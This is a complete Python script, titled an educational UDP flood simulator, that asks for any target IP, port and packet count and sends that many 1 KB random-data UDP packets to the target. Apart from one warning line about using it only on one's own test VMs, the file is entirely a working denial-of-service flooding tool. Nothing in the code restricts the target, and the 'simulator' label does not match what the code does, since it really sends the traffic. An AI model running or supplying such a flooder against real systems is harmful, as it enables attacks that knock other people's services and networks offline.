import socket
import random
import sys
import os # Imported for legacy random byte generation support if needed

def get_user_inputs():
    """Handles user input and validation."""
    print("--- Educational UDP Flood Simulator ---")
    print("WARNING: Use this ONLY on your own testing VMs (e.g., Metasploitable).")
    
    target_ip = input("Enter target IP: ")
    
    try:
        target_port = int(input("Enter target PORT: "))
        count = int(input("Enter number of packets to send: "))
        return target_ip, target_port, count
    except ValueError:
        print("Error: Port and Packet Count must be numbers.")
        sys.exit()

def run_simulation(ip, port, count):
    """Generates and sends UDP packets."""
    # Create the socket
    # Safe Fallback: Handle permission errors
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    except Exception as e:
        print(f"Error creating socket: {e}")
        sys.exit()

    print(f"\n[+] Sending {count} packets to {ip}:{port} with 1KB payload...")
    
    for i in range(count):
        # Generate 1024 bytes of random data
        # Note: 'random.randbytes' requires Python 3.9+. 
        # If you get an error, use 'os.urandom(1024)' instead.
        try:
            payload = random.randbytes(1024)
        except AttributeError:
            # Fallback for older Python versions
            payload = os.urandom(1024)

        try:
            sock.sendto(payload, (ip, port))
        except Exception as e:
            print(f"\n[-] Packet send failed: {e}")
            break # Stop if network fails

    print(f"\n[+] Operation finished.")
    sock.close()

# --- Main Execution ---
if __name__ == "__main__":
    # Get inputs
    t_ip, t_port, t_count = get_user_inputs()
    # Run the flood
    run_simulation(t_ip, t_port, t_count)